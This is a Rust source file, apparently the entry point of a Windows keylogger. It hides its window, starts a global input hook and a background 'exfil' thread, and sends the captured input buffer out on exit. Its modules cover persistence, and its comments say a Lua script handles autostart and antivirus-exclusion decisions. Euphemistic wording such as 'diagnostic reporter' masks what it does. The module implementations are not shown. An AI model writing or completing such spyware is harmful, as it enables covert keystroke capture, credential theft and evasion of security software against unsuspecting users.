#![windows_subsystem = "windows"]

mod config;
mod exfil;
mod hook;
mod logger;
mod lua_engine;
mod persist;

fn main() {
    // Initialise the Lua engine.
    // config.lua (if present) is loaded here and its on_startup() hook is called.
    // That script is where autostart / AV-exclusion decisions are made —
    // this binary only provides the infrastructure.
    if let Err(e) = lua_engine::init() {
        eprintln!("[diag] scripting unavailable: {}", e);
        // The diagnostic reporter continues even without scripting.
    }

    // Handle Ctrl-C gracefully.
    ctrlc::set_handler(move || {
        hook::stop_hook();
    })
    .ok();

    // Start the input-event listener and the background reporter.
    let listener_thread = hook::start_hook();
    let _reporter_thread = exfil::start_exfil_thread();

    listener_thread.join().ok();

    // Flush any remaining events on clean exit.
    let remaining = logger::take_buffer();
    if !remaining.is_empty() {
        logger::write_to_file(&remaining);
        let _ = exfil::send_data(&remaining);
    }
}
